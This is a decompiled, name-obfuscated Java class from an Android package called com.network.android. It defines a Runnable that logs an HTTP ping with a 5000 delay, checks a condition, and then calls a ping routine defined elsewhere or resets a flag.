package com.network.android.a;

import android.content.Context;
import com.network.android.c.a.a;
import com.network.android.j;

final class l implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ long f53a = 5000;
    final /* synthetic */ Context b;
    final /* synthetic */ boolean c;
    final /* synthetic */ boolean d;

    l(Context context, boolean z) {
        this.b = context;
        this.c = z;
        this.d = false;
    }

    public final void run() {
        try {
            a.a("Ping HTTP httpPingDelay exec:" + this.f53a);
            if (j.a(this.b, true, true)) {
                c.a(this.b, (byte[]) null, this.c, this.d);
            } else if (this.c && !this.d) {
                c.e = false;
            }
        } catch (Throwable th) {
            a.a("httpPing" + th.getMessage(), th);
        }
    }
}
